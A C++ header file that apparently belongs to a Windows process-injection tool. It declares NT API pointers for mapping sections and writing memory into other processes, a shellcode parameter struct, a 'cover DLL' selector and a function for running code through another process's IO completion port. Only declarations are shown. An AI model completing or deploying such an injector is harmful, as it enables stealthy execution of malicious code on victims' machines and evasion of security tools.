#pragma once
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <map>
#include <string>

typedef NTSTATUS(NTAPI* PFN_NtCreateSection)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
typedef NTSTATUS(NTAPI* PFN_NtMapViewOfSection)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
typedef NTSTATUS(NTAPI* PFN_NtUnmapViewOfSection)(HANDLE,PVOID);
typedef NTSTATUS(NTAPI* PFN_NtWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS(NTAPI* PFN_NtQO)(HANDLE,ULONG,PVOID,ULONG,PULONG);
typedef NTSTATUS(NTAPI* PFN_ZwSetIo)(HANDLE,PVOID,PVOID,NTSTATUS,ULONG_PTR);

extern HMODULE g_ntdll;

struct ShellcodeParams {
    uint64_t DllBase;
    uint64_t LoadLibrary;
    uint64_t GetProcAddr;
    uint32_t Stage;
    uint32_t Pad[5];
};

struct SectionInfo { int idx; LPVOID base; SIZE_T size; };

void random_temp_name(char* out);
std::string find_cover_dll(SIZE_T required_total);
std::map<int, SectionInfo> reserve_sections(HANDLE proc, const std::string& cover, SIZE_T needed);
HANDLE find_io_completion(HANDLE proc);
bool execute_via_iocp(HANDLE proc, uint64_t function_addr);
void apply_image_protections(HANDLE proc, uint64_t base, const IMAGE_NT_HEADERS64* nt, int block_count);
DWORD getpid();
